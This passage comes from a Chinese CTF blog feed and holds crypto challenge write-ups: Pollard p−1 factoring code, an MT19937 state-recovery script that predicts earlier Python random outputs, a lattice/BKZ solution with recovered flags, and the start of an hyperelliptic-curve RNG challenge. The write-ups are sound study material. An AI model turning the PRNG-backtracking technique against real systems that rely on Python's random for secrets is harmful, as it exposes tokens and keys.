145742860621666495489510776707734134231023214235535481878205099324276369445463746101469487674333600296204530932386373415987357363515200117271393133347844479863240936801112306080456942844796779477817786176831015954410967693647534326733641573842953783193563678040093734579772976410574013857063137696465850300484753282472377882118892522844694078667622111244886303620349388556315704648609353412177123230438077637042880490566244740468503369707900343076369151796123461132932226563486870411965536062339169788331659119981901553536009275158600580698576110294775989992794065611215170351808698605911258789407992833170968332058255364527244293283228694886707241979238145252395651417561576433516407782575454294499521347378058366557950770592472271985004818847838711060048422015207674862177145761946560579360220239667890707135827136815780729363013864130107808776517514214310689477005999830284272130148939734935547341627208913181919190392205389452185597444280635342938046191904062547803917870268485346888653569349729643793041018550170090471310374856687407102762116819004790791936814214507908374380597027347007448114684844276041116955473180015221164545212550832233007714133699817366745648092776901013502840540012912660742166994968977400188176557657864</span></span><br></pre></td></tr></table></figure>

<p>显然p是n-1类型的光滑数，但是直接食用工具，效果不佳；再次确认，前面的两题是出题人有意为之</p>
<p>所以跟着CSDN大佬来看下Pollard’s p−1算法的食用方法</p>
<blockquote>
<p>推导步奏</p>
</blockquote>
<p>目标很明确，通过p分解n</p>
<p>所谓的Pollard’s p−1算法就是<br>如果p-1是光滑数，那么n!就能被p-1整除，即n!=t(p-1)<br>对于n=2,3,4,…，只要<br>$$<br>gcd(2^{n!}-1, N)\neq 1和N<br>$$<br>就成功分解N了<br>以上算法适用于p是N的因数，且p-1是光滑数</p>
<p>当然求n的阶乘是个耗费资源的事情，所以我们对递归式子精心简化，这样就不用重复计算了<br>$$<br>2^{n!}\ mod\ N=(2^{(n-1)!}\ mod\ N)^{n}\ mod\ N<br>$$</p>
<p>而由我们熟悉的费马定理可以推出<br>$$<br>2^{t(p-1)}\equiv 1\ mod\ p<br>$$<br>改写成等式<br>$$<br>2^{t(p-1)}-1=kp<br>$$<br>所以$2^{t(p-1)}-1$是p的倍数，结合前面推出的，我们得到的结论是<br>$$<br>2^{n!}-1=kp<br>$$<br><strong>通过枚举n求kp，求kp和N的公因子就是p</strong></p>
<p>也没看得特别懂，最后得到的递推式子是<br>$$<br>2^{n!}\ mod\ N=<br>\begin{cases}<br>2^2\ mod\ N&amp; {n=2}\\<br>(2^{(n-1)!}\ mod\ N)^n\ mod\ N&amp; {n \geq 3}<br>\end{cases}<br>$$</p>
<p>抄了别人这么多了，自己实现一下代码</p>
<p>感觉被套路了，还是自己算法到代码的能力太差；最后写出来的脚本是这样的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_p_1</span>(<span class="params">n</span>):</span></span><br><span class="line">    a = <span class="number">2</span></span><br><span class="line">    i = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> gcd(a-<span class="number">1</span>, n) == <span class="number">1</span> <span class="keyword">or</span> gcd(a-<span class="number">1</span>, n) == n:</span><br><span class="line">        a = <span class="built_in">pow</span>(a, i, n)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">return</span> gcd(a-<span class="number">1</span>, n)</span><br></pre></td></tr></table></figure>

<p>要跑挺久的，虽然也才十几万次</p>
<p>最后得到的flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Pollard_s_p-1_&amp;_William_s_p+1&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h3><blockquote>
<p> 题目描述</p>
</blockquote>
<p>Can you trace back to the past?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/env/python3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">        f.write(<span class="built_in">str</span>(random.getrandbits(<span class="number">32</span>)) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解题思路</p>
</blockquote>
<p>题目名为回溯</p>
<p>妥妥的MT19937，好在之前做过；它有一千个随机数，需要找到这一千个随机数的前面一个</p>
<p>问题来了，之前GKCTF做到的，以及之前类似的题目都是预测之后的随机数，那么要反过来，预测之前的那应该怎么做呢？</p>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706221554229.png" alt="image-20210706221554229"></p>
<p>别急，大佬还是有解法，贴下连接这里直接抄脚本了，后续研究</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> Random</span><br><span class="line"><span class="comment"># right shift inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_right</span>(<span class="params">res,shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &gt;&gt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># right shift with mask inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_right_values</span>(<span class="params">res,shift,mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp&gt;&gt;shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># left shift inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_left</span>(<span class="params">res,shift,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"><span class="comment"># left shift with mask inverse</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_left_values</span>(<span class="params">res,shift,mask,bits=<span class="number">32</span></span>):</span></span><br><span class="line">    tmp = res</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(bits//shift):</span><br><span class="line">        tmp = res ^ tmp &lt;&lt; shift &amp; mask</span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backtrace</span>(<span class="params">cur</span>):</span></span><br><span class="line">    high = <span class="number">0x80000000</span></span><br><span class="line">    low = <span class="number">0x7fffffff</span></span><br><span class="line">    mask = <span class="number">0x9908b0df</span></span><br><span class="line">    state = cur</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = state[i+<span class="number">624</span>]^state[i+<span class="number">397</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        <span class="comment"># recover highest bit</span></span><br><span class="line">        res = tmp&amp;high</span><br><span class="line">        <span class="comment"># recover other 31 bits,when i =0,it just use the method again it so beautiful!!!!</span></span><br><span class="line">        tmp = state[i-<span class="number">1</span>+<span class="number">624</span>]^state[i+<span class="number">396</span>]</span><br><span class="line">        <span class="comment"># recover Y,tmp = Y</span></span><br><span class="line">        <span class="keyword">if</span> tmp &amp; high == high:</span><br><span class="line">            tmp ^= mask</span><br><span class="line">            tmp &lt;&lt;= <span class="number">1</span></span><br><span class="line">            tmp |= <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tmp &lt;&lt;=<span class="number">1</span></span><br><span class="line">        res |= (tmp)&amp;low</span><br><span class="line">        state[i] = res</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_state</span>(<span class="params">out</span>):</span></span><br><span class="line">    state = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> out:</span><br><span class="line">        i = inverse_right(i,<span class="number">18</span>)</span><br><span class="line">        i = inverse_left_values(i,<span class="number">15</span>,<span class="number">0xefc60000</span>)</span><br><span class="line">        i = inverse_left_values(i,<span class="number">7</span>,<span class="number">0x9d2c5680</span>)</span><br><span class="line">        i = inverse_right(i,<span class="number">11</span>)</span><br><span class="line">        state.append(i)</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;../output.txt&quot;</span>,<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">c = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    c.append(<span class="built_in">int</span>(f[i].strip()))</span><br><span class="line"></span><br><span class="line">partS = recover_state(c)</span><br><span class="line">state = backtrace([<span class="number">0</span>]*<span class="number">4</span>+partS)[:<span class="number">624</span>]</span><br><span class="line"><span class="comment"># print(state)</span></span><br><span class="line">prng = Random()</span><br><span class="line">prng.setstate((<span class="number">3</span>,<span class="built_in">tuple</span>(state+[<span class="number">0</span>]),<span class="literal">None</span>))</span><br><span class="line">flag = <span class="string">&quot;flag&#123;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">str</span>(prng.getrandbits(<span class="number">32</span>)) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)) + <span class="string">&quot;&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<hr>
<p><img src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/image-20210706221821180.png" alt="image-20210706221821180"></p>
<p>你说说你还有什么用，只会抄WP</p>
<p>花了两天，算是过了一遍，但是越到后面，研究的劲头就越低，很多资料还是要消化成自己的东西</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>光滑数</tag>
      </tags>
  </entry>
  <entry>
    <title>20210509 RedhatCrypto方向WP</title>
    <url>/posts/e881af84/</url>
    <content><![CDATA[<p>emmmmm发现都是原题，当时还不善用搜索引擎，打得不怎么样</p>
<span id="more"></span>

<h1 id="20210509-RedhatCrypto方向WP"><a href="#20210509-RedhatCrypto方向WP" class="headerlink" title="20210509 RedhatCrypto方向WP"></a>20210509 RedhatCrypto方向WP</h1><h2 id="primegame（recuring）"><a href="#primegame（recuring）" class="headerlink" title="primegame（recuring）"></a>primegame（recuring）</h2><h3 id="一、题目"><a href="#一、题目" class="headerlink" title="一、题目"></a>一、题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> (<span class="built_in">len</span>(flag) == <span class="number">48</span>)</span><br><span class="line">msg1 = flag[:<span class="number">24</span>]</span><br><span class="line">msg2 = flag[<span class="number">24</span>:]                        </span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">100</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(msg1)):</span><br><span class="line">    keys.append(Decimal(primes[i]).ln())</span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg1):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)                  </span><br><span class="line"></span><br><span class="line">sum_ = Decimal(<span class="number">0.0</span>)</span><br><span class="line"><span class="keyword">for</span> i, c <span class="keyword">in</span> <span class="built_in">enumerate</span>(msg2):</span><br><span class="line">    sum_ += c * Decimal(keys[i])</span><br><span class="line"></span><br><span class="line">ct = math.floor(sum_ * <span class="number">2</span> ** <span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(ct)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ct1 = 597952043660446249020184773232983974017780255881942379044454676980646417087515453</span><br><span class="line">ct2 = 425985475047781336789963300910446852783032712598571885345660550546372063410589918</span><br></pre></td></tr></table></figure>

<h3 id="二、解题思路"><a href="#二、解题思路" class="headerlink" title="二、解题思路"></a>二、解题思路</h3><p>这道题原本的思路是加一个底数e，然后依次逼近msg里的各个值的</p>
<img alt="README-ea39f5b9.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-ea39f5b9.png" width="" height="" >

<p>但是几次给我sage跑挂了，应该是精度和容量问题，而且sage不支持decimal设置精度</p>
<p>然后想到之前有道类似的题目，因为它这里一直在c乘以keys[i]，有24组，所以就想到了格，构造一个类似这样子的格</p>
<img alt="README-423b7374.png" src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/README-423b7374.png" width="" height="" >

<p>先是得到我们的对数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">primes = [<span class="number">2</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">90</span>):</span><br><span class="line">    f = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> primes:</span><br><span class="line">        <span class="keyword">if</span> i * i &lt; j:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> i % j == <span class="number">0</span>:</span><br><span class="line">            f = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f:</span><br><span class="line">        primes.append(i)</span><br><span class="line"></span><br><span class="line">getcontext().prec = <span class="number">100</span>         <span class="comment"># 设置精度</span></span><br><span class="line">keys = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    keys.append(Decimal(primes[i]).ln())</span><br></pre></td></tr></table></figure>

<p>然后将矩阵第一列求出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    keys[i] = keys[i]*<span class="number">2</span>**<span class="number">256</span></span><br><span class="line"><span class="comment"># keys = [Decimal(&#x27;80260960185991308862233904206310070533990667611589946606122867505419956976171.90515840808613629846290&#x27;), Decimal(&#x27;127210612166669937440098469708903225618405881204503139663605609326034899514764.6663743746583129556012&#x27;), Decimal(&#x27;186360178378489239360019555208872516895923557828929525429878875918225512971166.4414609219754360277383&#x27;), Decimal(&#x27;225321001627212097357564035919404985096695078055324870037864774600825628967482.2417219510600154726596&#x27;), Decimal(&#x27;277657303409607584257674154656459195924000370301674371438196861060248384105244.3993444331039604677255&#x27;), Decimal(&#x27;297000844888383098784779809484430885883324243241834148304083596811292939014380.4674208212385311778134&#x27;), Decimal(&#x27;328063692363312405002199287825630301497469991361288129915249443621480610038009.0012924032254942097990&#x27;), Decimal(&#x27;340942741029472675751209085563496509709453734782185827155063370803195952763341.5492681559934516393628&#x27;), Decimal(&#x27;363065426053956876789136573439806831974720562089628946045509535722562500188081.9345554269406941498189&#x27;), Decimal(&#x27;389906219234236504589839583602940131460157322576695243167328885608693810978037.4477298393894375836391&#x27;), Decimal(&#x27;397628552821546031788284866976481005071491904149911534621248760160933669557251.4099945654069429986781&#x27;), Decimal(&#x27;418115729169523563213795873608243120399117141324174913328486917994007765693981.2677229007073901042419&#x27;), Decimal(&#x27;430002268137029940210248704949846802606196021901113383903617291334026458415238.4390037473159660462055&#x27;), Decimal(&#x27;435517219435792978548914327540992832715555899417703687725132714593809971489386.4866743125661788819556&#x27;), Decimal(&#x27;445816634674050036737403156155461234669588861822924489511566801569753428925196.7122521424369127568677&#x27;), Decimal(&#x27;459728395552222169203258553855093151725069310363221663578223702572833827483180.5712997266924709004859&#x27;), Decimal(&#x27;472146579573229247119622639984879073370128462957392372371001752039887754216862.2605246111880684783030&#x27;), Decimal(&#x27;476006673323706912851925923936227700248085741335072682402231383534286110106849.6653976943352393620303&#x27;), Decimal(&#x27;486870143000003523136729364348591878682677901545106867214896561445453739365505.3439314072483902595509&#x27;), Decimal(&#x27;493584608712480022671713045430033257561446779236439588774651853861690675528490.3655085296010121315316&#x27;), Decimal(&#x27;496801262478540279019120702773153789961300482567894655561867654179758267817025.5210934638564971187839&#x27;), Decimal(&#x27;505947495650660962867352926325259167807382070922044420606608075589355194666475.2011794828006546336392&#x27;), Decimal(&#x27;511666785983460201877755690981276626403123717604080991115075395552267140888834.5141513226162039281301&#x27;), Decimal(&#x27;519748583077886948223642831481589001894608334341623554432584379082164654601617.7552630658083904530520&#x27;)]</span></span><br></pre></td></tr></table></figure>

<p>这里因为格式的种种问题，直接将keys取整数提出来了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">keys = [<span class="number">80260960185991308862233904206310070533990667611589946606122867505419956976171</span>, <span class="number">127210612166669937440098469708903225618405881204503139663605609326034899514764</span>, <span class="number">186360178378489239360019555208872516895923557828929525429878875918225512971166</span>, <span class="number">225321001627212097357564035919404985096695078055324870037864774600825628967482</span>, <span class="number">277657303409607584257674154656459195924000370301674371438196861060248384105244</span>, <span class="number">297000844888383098784779809484430885883324243241834148304083596811292939014380</span>, <span class="number">328063692363312405002199287825630301497469991361288129915249443621480610038009</span>, <span class="number">340942741029472675751209085563496509709453734782185827155063370803195952763341</span>, <span class="number">363065426053956876789136573439806831974720562089628946045509535722562500188081</span>, <span class="number">389906219234236504589839583602940131460157322576695243167328885608693810978037</span>, <span class="number">397628552821546031788284866976481005071491904149911534621248760160933669557251</span>, <span class="number">418115729169523563213795873608243120399117141324174913328486917994007765693981</span>, <span class="number">430002268137029940210248704949846802606196021901113383903617291334026458415238</span>, <span class="number">435517219435792978548914327540992832715555899417703687725132714593809971489386</span>, <span class="number">445816634674050036737403156155461234669588861822924489511566801569753428925196</span>, <span class="number">459728395552222169203258553855093151725069310363221663578223702572833827483180</span>, <span class="number">472146579573229247119622639984879073370128462957392372371001752039887754216862</span>, <span class="number">476006673323706912851925923936227700248085741335072682402231383534286110106849</span>, <span class="number">486870143000003523136729364348591878682677901545106867214896561445453739365505</span>, <span class="number">493584608712480022671713045430033257561446779236439588774651853861690675528490</span>, <span class="number">496801262478540279019120702773153789961300482567894655561867654179758267817025</span>, <span class="number">505947495650660962867352926325259167807382070922044420606608075589355194666475</span>, <span class="number">511666785983460201877755690981276626403123717604080991115075395552267140888834</span>, <span class="number">519748583077886948223642831481589001894608334341623554432584379082164654601617</span>]</span><br></pre></td></tr></table></figure>

<p>构造格</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = matrix(ZZ, <span class="number">25</span>, <span class="number">25</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    m[i, i]=<span class="number">1</span></span><br><span class="line">    m[<span class="number">24</span>, i] = keys[i]</span><br><span class="line">m[<span class="number">24</span>, <span class="number">24</span>]= -ct1</span><br><span class="line"></span><br><span class="line">c1= m.transpose().BKZ()[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>跑出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c1 = [<span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">55</span>, <span class="number">49</span>, <span class="number">53</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">57</span>, <span class="number">99</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">49</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">52</span>, <span class="number">99</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">845</span>]</span><br></pre></td></tr></table></figure>

<p>同理</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c2 = [<span class="number">56</span>, <span class="number">48</span>, <span class="number">48</span>, <span class="number">54</span>, <span class="number">45</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">98</span>, <span class="number">52</span>, <span class="number">51</span>, <span class="number">101</span>, <span class="number">98</span>, <span class="number">97</span>, <span class="number">50</span>, <span class="number">52</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">125</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">604</span>]</span><br></pre></td></tr></table></figure>

<p>最后转一下ascii</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c2:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="string">&#x27;0x66def695b20eeae3141ea80240e9bc7138c8fc5aef20532282944ebbbad76a6e17446e92de5512091fe81255eb34a0e22a86a090e25dbbe3141aff0542f5&#x27;</span>, <span class="number">16</span>)))</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">flag&#123;715c39c3-1b46-4c23-͍<span class="number">8006</span>-27b43eba2446&#125;      ɜ</span><br></pre></td></tr></table></figure>

<p>有点奇怪，把奇怪的地方去掉，就好了</p>
<h2 id="hpcurve（unsolved）"><a href="#hpcurve（unsolved）" class="headerlink" title="hpcurve（unsolved）"></a>hpcurve（unsolved）</h2><p>完全不懂，师傅没必要看了，只是改脚本的屑</p>
<h3 id="一、题目-1"><a href="#一、题目-1" class="headerlink" title="一、题目"></a>一、题目</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line">R.&lt;x&gt; = GF(p)[]</span><br><span class="line">y=x</span><br><span class="line">f = y + y^<span class="number">7</span></span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line">es = [SystemRandom().randrange(p**<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line">q = []</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">clk</span>():</span></span><br><span class="line">	<span class="keyword">global</span> Ds,es</span><br><span class="line">	Ds = [e*D <span class="keyword">for</span> e,D <span class="keyword">in</span> <span class="built_in">zip</span>(es, Ds)]</span><br><span class="line">	<span class="keyword">return</span> Ds</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    u,v = <span class="built_in">sum</span>(clk())</span><br><span class="line">    rs = [u[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)] + [v[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">    <span class="keyword">assert</span> <span class="number">0</span> <span class="keyword">not</span> <span class="keyword">in</span> rs <span class="keyword">and</span> <span class="number">1</span> <span class="keyword">not</span> <span class="keyword">in</span> rs</span><br><span class="line">    q = struct.pack(<span class="string">&#x27;&lt;&#x27;</span>+<span class="string">&#x27;Q&#x27;</span>*<span class="built_in">len</span>(rs), *rs)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;flag&#123;xxxxxxx&#125;&quot;</span></span><br><span class="line">text = <span class="string">&#x27;a&#x27;</span>*<span class="number">20</span>+flag</span><br><span class="line">t = <span class="string">&#x27;&#x27;</span></span><br><span class="line">keys = generate()</span><br><span class="line">leng = <span class="built_in">len</span>(keys)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> text:</span><br><span class="line">    t += <span class="built_in">chr</span>(<span class="built_in">ord</span>(keys[i%leng])^^<span class="built_in">ord</span>(x))</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(t.encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line"><span class="comment">#for x,y in zip(RNG(),flag):</span></span><br><span class="line"></span><br><span class="line">flag&#123;1b82f60a-43ab-4f18-8ccc</span><br></pre></td></tr></table></figure>

<h3 id="二、解题脚本"><a href="#二、解题脚本" class="headerlink" title="二、解题脚本"></a>二、解题脚本</h3><p>是hxpCTF2020的题目</p>
<p>原题是</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env sage</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> SystemRandom</span><br><span class="line"></span><br><span class="line">p = <span class="number">10000000000000001119</span></span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = GF(p)[]; y=x</span><br><span class="line">f = y + prod(<span class="built_in">map</span>(<span class="built_in">eval</span>, <span class="string">&#x27;yyyyyyy&#x27;</span>))</span><br><span class="line">C = HyperellipticCurve(f, <span class="number">0</span>)</span><br><span class="line">J = C.jacobian()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RNG</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.es = [SystemRandom().randrange(p**<span class="number">3</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">        self.Ds = [J(C(x, <span class="built_in">min</span>(f(x).sqrt(<span class="number">0</span>,<span class="number">1</span>)))) <span class="keyword">for</span> x <span class="keyword">in</span> (<span class="number">11</span>,<span class="number">22</span>,<span class="number">33</span>)]</span><br><span class="line">        self.q = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clk</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.Ds = [e*D <span class="keyword">for</span> e,D <span class="keyword">in</span> <span class="built_in">zip</span>(self.es, self.Ds)]</span><br><span class="line">        <span class="keyword">return</span> 